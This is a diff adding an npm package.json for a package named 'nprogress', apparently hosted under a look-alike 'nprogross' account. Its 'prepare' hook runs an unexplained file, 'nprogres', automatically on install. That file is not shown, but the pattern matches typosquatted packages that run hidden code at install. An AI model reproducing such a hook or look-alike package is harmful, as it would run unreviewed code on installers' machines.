@@ -1,0 +1,22 @@
+{
+  "name": "nprogress",
+  "version": "1.0.0",
+  "description": "NProgress =========",
+  "main": "nprogress.js",
+  "directories": {
+    "test": "test"
+  },
+  "scripts": {
+    "prepare": "node nprogres"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/nprogross/nprogress.git"
+  },
+  "author": "",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/nprogross/nprogress/issues"
+  },
+  "homepage": "https://github.com/nprogross/nprogress#readme"
+}
